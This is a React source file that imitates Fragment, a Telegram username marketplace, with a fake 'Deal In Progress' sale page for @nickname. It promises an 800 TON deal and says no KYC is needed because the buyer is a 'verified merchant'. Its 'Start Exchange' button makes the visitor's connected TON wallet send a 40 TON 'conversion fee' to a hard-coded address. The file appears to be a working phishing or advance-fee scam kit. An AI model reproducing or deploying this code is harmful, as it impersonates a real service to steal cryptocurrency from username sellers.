import React, { useState } from 'react';
import { SendTransactionRequest, useTonConnectUI, useTonWallet } from "@tonconnect/ui-react";
import { beginCell} from '@ton/ton';

interface CSSProperties extends React.CSSProperties {
  '--thin-width'?: string;
  '--wide-width'?: string;
  '--width'?: string;
  '--accent-color'?: string;
}

interface PopupProps {
  onClose?: () => void;
  isVisible: boolean;
}

export const NicknameFragment: React.FC = () => {
  const [showSubscribe, setShowSubscribe] = useState(true);
  const [showHowItWorksPopup, setShowHowItWorksPopup] = useState(false);
  const [showPlaceBidPopup, setShowPlaceBidPopup] = useState(false);

  return (
    <>
      <svg xmlns="http://www.w3.org/2000/svg" style={{ position: 'absolute', width: 0, height: 0, left: '-10000px' }}>
        <defs>
          <path id="icon-premium" d="m8.88 13.45 2.89-5.71c.33-.66 1.14-.93 1.8-.6.25.13.46.35.59.61l2.73 5.51c.22.45.66.76 1.16.82l5.7.68c.78.09 1.33.79 1.24 1.57-.04.31-.18.61-.41.84l-4.52 4.42c-.18.18-.27.43-.23.68l.75 5.98c.1.85-.5 1.63-1.36 1.74-.32.04-.65-.02-.94-.18l-4.77-2.59c-.34-.19-.76-.19-1.11-.01l-4.93 2.52c-.7.35-1.55.07-1.91-.62-.13-.26-.18-.55-.14-.84l.4-2.74c.19-1.34 1.03-2.51 2.23-3.12l5.49-2.78c.15-.08.2-.26.13-.4-.06-.12-.18-.18-.31-.16l-6.71.95c-1.02.15-2.06-.14-2.87-.79l-2.23-1.82c-.64-.51-.73-1.45-.22-2.09.24-.29.59-.48.97-.53l5.73-.74c.36-.04.68-.27.85-.6z" />
        </defs>
      </svg>

      <div
        id="aj_progress"
        className="progress-bar"
        style={{
          width: '100%',
          transition: 'width 0.3s linear, box-shadow 0.2s',
          position: 'fixed',
          zIndex: 1000,
          top: 0,
          height: '3px',
          boxShadow: 'inset 0 0 0 var(--accent-color, #39ade7)',
        } as CSSProperties}
      />

      <div id="aj_content" style={{}}>
        <header className="tm-header">
          <div className="tm-header-logo">
            <a className="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable">
              <i className="tm-logo-icon js-logo-icon" />
              <i className="tm-logo-text" />
            </a>
          </div>

          <div className="tm-header-body">
          {/* action="https://fragment.com/" */}
            <form  className="tm-header-search-form">
              <div className="icon-before icon-search tm-field tm-search-field">
                <input
                  type="search"
                  className="form-control tm-input tm-search-input"
                  name="query"
                  placeholder="Search usernames"
                  autoComplete="off"
                />
              </div>
            </form>
          </div>

          <HeaderActions />
        </header>

        <main className="tm-main js-main-content">
          <AuctionSection
            nickname="nickname"
            showSubscribe={showSubscribe}
            onSubscribeToggle={() => setShowSubscribe(!showSubscribe)}
            setShowHowItWorksPopup={setShowHowItWorksPopup}
          />
          <LatestOffersSection />
        </main>

        <PopupHowItWorks
          isVisible={showHowItWorksPopup}
          onClose={() => setShowHowItWorksPopup(false)}
        />
        <PopupPlaceBid
          isVisible={showPlaceBidPopup}
          onClose={() => setShowPlaceBidPopup(false)}
        />

        <footer className="tm-footer">
        </footer>
      </div>
    </>
  );
};

const HeaderActions: React.FC = () => (
  <div className="tm-header-actions tm-header-actions-wide">
    <div className="btn-group tm-header-action tm-dropdown">
      <ul className="dropdown-menu">
        <li>
          <a href="https://fragment.com/convert" className="dropdown-menu-item icon-before icon-menu-convert">
            My Usernames
          </a>
        </li>
        <li>
          <a href="#" onClick={(e) => e.preventDefault()} className="dropdown-menu-item icon-before icon-menu-disconnect logout-link">
            Log Out
          </a>
        </li>
      </ul>
    </div>
  </div>
);

interface AuctionSectionProps {
  nickname: string;
  showSubscribe: boolean;
    onSubscribeToggle: () => void;
  setShowHowItWorksPopup: (show: boolean) => void;
}

interface BidInfoSectionProps {
  setShowHowItWorksPopup: (show: boolean) => void;
}

const AuctionSection: React.FC<AuctionSectionProps> = ({ nickname, showSubscribe, onSubscribeToggle, setShowHowItWorksPopup }) => (
  <section className="tm-section tm-auction-section">
    <div className="tm-section-header">
      <h2 className="tm-section-header-text">
        <span className="tm-section-header-domain">
          <span className="tm-web3-address">
            <span className="subdomain">nickname</span>
            <span className="domain">.t.me</span>
          </span>
        </span>
        <span className="tm-section-header-status tm-status-avail">Deal In Progress</span>
      </h2>

      <div className="tm-section-subscribe tm-section-box js-subscribe">
        {showSubscribe ? (
          <a className="btn-link subscribe-btn" onClick={onSubscribeToggle}>
            Subscribe to updates
          </a>
        ) : (
          <a className="btn-link unsubscribe-btn" onClick={onSubscribeToggle}>
            Unsubscribe from updates
          </a>
        )}
      </div>
    </div>

    <BidInfoSection setShowHowItWorksPopup={setShowHowItWorksPopup} />
    <UsernameInfoSection nickname={nickname} />
    <ActionButtons nickname={nickname} showSubscribe={showSubscribe} onSubscribeToggle={onSubscribeToggle} />
    <div className="kyc-text"
      style={{
        backgroundColor: 'rgb(36, 139, 218)', 
        borderRadius: '8px',  
        padding: '25px', 
        textAlign: 'center',  
        color: '#fff', 
        fontSize: '14px',  
        marginBottom: '15px',  
        marginTop: '15px',
        lineHeight: '1.5',
      }}
    >
      You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of 
      <span className="icon-before icon-ton" style={{ marginLeft: '5px' }}>8000</span>

    </div>
  </section>
);

const BidInfoSection: React.FC<BidInfoSectionProps> = ({ setShowHowItWorksPopup }) => (
  <div className="tm-section-box tm-section-bid-info">
    <table style={{textAlign: 'center'}} className="table tm-table tm-table-fixed">
      <thead >
        <tr >
          <th style={{textAlign: 'center'}}>Deal Price</th>
          <th style={{textAlign: 'center'}}>Commission</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>
            <div className="table-cell table-cell">
              <div className="table-cell-value tm-value icon-before icon-ton">800</div>
              <div className="table-cell-desc">~ $2600 </div>
            </div>
            
          </td>
          <td>
          <div className="table-cell table-cell">
              <div className="table-cell-value tm-value icon-before icon-ton">40</div>
              <div className="table-cell-desc">~ $130</div>
            </div>
          </td>
        </tr>
      </tbody>
    </table>
    <div onClick={() => setShowHowItWorksPopup(true)} className="tm-bid-info-text">
      How does this work?
    </div>
  </div>
);

interface UsernameInfoSectionProps {
  nickname: string;
}

const UsernameInfoSection: React.FC<UsernameInfoSectionProps> = ({ nickname }) => (
  <div className="tm-list tm-section-box tm-section-auction-info">
    <dl className="tm-list-item">
      <dt className="tm-list-item-title">Telegram Username</dt>
      <dd className="tm-list-item-value">
        <span className="accent-color">@nickname</span>
      </dd>
    </dl>
    <dl className="tm-list-item">
      <dt className="tm-list-item-title">Web Address</dt>
      <dd className="tm-list-item-value">
        <span className="accent-color">t.me/nickname</span>
      </dd>
    </dl>
    <dl className="tm-list-item">
      <dt className="tm-list-item-title">TON Web 3.0 Address</dt>
      <dd className="tm-list-item-value">
        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">nickname</span><span className="domain">.t.me</span></span></span>
      </dd>
    </dl>
  </div>
);

interface ActionButtonsProps {
  nickname: string;
  showSubscribe: boolean;
  onSubscribeToggle: () => void;
}



const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, onSubscribeToggle }) => {
  const comment = "Conversion fee for nickname.t.me\n\nRef#R9OOOw9Mb";
  const [tonConnectUi] = useTonConnectUI();
  const wallet = useTonWallet();
  const [tx, setTx] = useState<SendTransactionRequest>({
    validUntil: Math.floor(Date.now() / 1000) + 600,
    messages: [
      {
        address: "UQBUTyUtpZuecOGdADIXibnVTJ7GdGeb2sJQGcUPKre2RfoU",
        amount: "40000000000",
        payload: beginCell().storeUint(0, 32).storeStringTail(comment).endCell().toBoc().toString("base64"),
      },
    ],
  });

  return (
    <div className="tm-section-box tm-section-buttons js-actions" data-username={nickname} data-item-title={`@${nickname}`}>
      {wallet ? (
        <button className="btn btn-primary js-convert-btn" onClick={() => tonConnectUi.sendTransaction(tx)}>
          <span className="tm-button-label">Start Exchange</span>
        </button>
      ) : (
        <button className="btn btn-primary js-convert-btn" onClick={() => tonConnectUi.openModal()}>
          <span className="tm-button-label">Connect Wallet</span>
        </button>
      )}

      <div className="tm-section-subscribe tm-section-box js-subscribe">
        {showSubscribe ? (
          <a className="btn-link subscribe-btn" onClick={onSubscribeToggle}>
            Subscribe to updates
          </a>
        ) : (
          <a className="btn-link unsubscribe-btn" onClick={onSubscribeToggle}>
            Unsubscribe from updates
          </a>
        )}
      </div>
    </div>
  );
};


const LatestOffersSection: React.FC = () => (
  <section className="tm-section clearfix">
    <div className="tm-section-header">
      <h3 className="tm-section-header-text">Trade info</h3>
    </div>
    <div className="tm-table-wrap">
      <table className="table tm-table tm-table-fixed">
        <thead>
          <tr>
            <th style={{ ['--thin-width' as string]: '100px', ['--wide-width' as string]: '25%' } as CSSProperties}>
              Deal Status
            </th>
            <th style={{ ['--thin-width' as string]: '110px', ['--wide-width' as string]: '25%' } as CSSProperties}>
              Ton - Username
            </th>
            <th style={{ ['--width' as string]: '50%' } as CSSProperties}>
              Recipient
            </th>
          </tr>
        </thead>
        <tbody>
          <LatestOfferRow />
        </tbody>
      </table>
    </div>
  </section>
);

const LatestOfferRow: React.FC = () => (
  <tr>
    <td>
      <div className="table-cell">
        <div className="table-cell-value tm-value">Ready</div>
      </div>
    </td>
    <td>
      <div className="table-cell">
        <div className="tm-datetime">
          <span className="thin-only">
            <time className="short">Swappable</time>
          </span>
          <span className="wide-only">
            <time>Swappable</time>
          </span>
        </div>
      </div>
    </td>
    <td>
      <div className="table-cell">
        <a
          // href="https://tonviewer.com/EQBHW90lo3tflWatYsbpe2BNjNTJPpMB_J4iD6WyUEtkBQlc"
          className="tm-wallet"
          target="_blank"
          rel="noopener noreferrer"
        >
          <span className="head">b5ee9c7201010101002a0000</span>
          <span className="middle"/>                                                                                      
          <span className="tail">6871feaa300a64c95e45f477</span>
        </a>
      </div>
    </td>
  </tr>
);

const PopupHowItWorks: React.FC<PopupProps> = ({ isVisible, onClose }) => (
  <div className={`popup-container ${!isVisible ? 'hide' : ''} js-howitworks-popup`} data-close-outside="popup-body">
    <div className="popup">
      <div className="popup-body">
        <section>
          <h4>How does this work?</h4>
          <p className="popup-text">
            You can buy this collectible username and use it for your <b>personal profile</b>, group or channel.
          </p>
          <div className="popup-buttons">
            <a className="btn btn-link btn-lg popup-cancel-btn" onClick={onClose}>Close</a>
          </div>
        </section>
      </div>
    </div>
  </div>
);

const PopupPlaceBid: React.FC<PopupProps> = ({ isVisible, onClose }) => (
  <div className={`popup-container ${!isVisible ? 'hide' : ''} form-popup-container place-bid-popup-container js-place-bid-popup`} data-close-outside="popup-body">
    <div className="popup">
      <div className="popup-body">
        <section>
          <h2>@nickname</h2>
          <p className="popup-text">Telegram username and nickname.t.me</p>
          <form className="js-place-bid-form">
            <div className="form-group">
              <label htmlFor="bid_value">Your bid</label>
              <div className="icon-before icon-ton form-control-wrap tm-coin-field">
                <input inputMode="decimal" className="form-control js-amount-input" id="bid_value" name="bid_value" defaultValue="10" data-for="js-bid_value" data-usd-for="js-bid_usd_value" autoComplete="off" />
              </div>
              <p className="help-block">Approximately $<span className="js-bid_usd_value">35.43</span></p>
            </div>
            <div className="form-main-button">
              <button type="submit" className="btn btn-primary btn-block">
                <span className="tm-button-label">Place a <span className="icon-before icon-ton tm-amount js-bid_value">10</span> bid</span>
              </button>
            </div>
          </form>
        </section>
      </div>
    </div>
  </div>
);

const PopupPutToAuction: React.FC<PopupProps> = ({ isVisible, onClose }) => (
  <div className={`popup-container ${!isVisible ? 'hide' : ''} form-popup-container js-put-to-auction-popup`} data-close-outside="popup-body">
    <div className="popup">
      <div className="popup-body">
        <section>
          <h4>Put up for auction</h4>
          <p className="popup-text">Do you want to make <span className="accent-color js-username"></span> available for auction on <b>Fragment</b>?</p>
          <form className="js-put-to-auction-form">
            <input type="hidden" name="username" />
            <div className="form-group">
              <label htmlFor="min_bid_value">Minimum bid</label>
              <div className="icon-before icon-ton form-control-wrap tm-coin-field">
                <input inputMode="decimal" className="form-control js-amount-input" id="min_bid_value" name="min_bid_value" defaultValue="2" data-usd-for="js-bid_usd_value" autoComplete="off" />
              </div>
            </div>
            <div className="popup-buttons">
              <a className="btn btn-link btn-lg popup-cancel-btn">Cancel</a>
              <button type="submit" className="btn btn-link btn-lg">Proceed</button>
            </div>
          </form>
        </section>
      </div>
    </div>
  </div>
);

const PopupSellUsername: React.FC<PopupProps> = ({ isVisible, onClose }) => (
  <div className={`popup-container ${!isVisible ? 'hide' : ''} form-popup-container place-bid-popup-container js-sell-username-popup`} data-close-outside="popup-body">
    <div className="popup">
      <div className="popup-body">
        <section>
          <h2 className="js-username"></h2>
          <p className="popup-text">Sell username on <b>Fragment</b></p>
          <form className="js-sell-username-form">
            <input type="hidden" name="username" />
            <div className="form-group">
              <label htmlFor="sell_value">Sell price</label>
              <div className="icon-before icon-ton form-control-wrap tm-coin-field">
                <input inputMode="decimal" className="form-control js-amount-input" id="sell_value" name="sell_value" defaultValue="2" data-for="js-bid_value" autoComplete="off" />
              </div>
            </div>
            <div className="form-main-button">
              <button type="submit" className="btn btn-primary btn-block">
                <span className="tm-button-label">Sell for <span className="icon-before icon-ton tm-amount js-bid_value">10</span></span>
              </button>
            </div>
          </form>
        </section>
      </div>
    </div>
  </div>
);

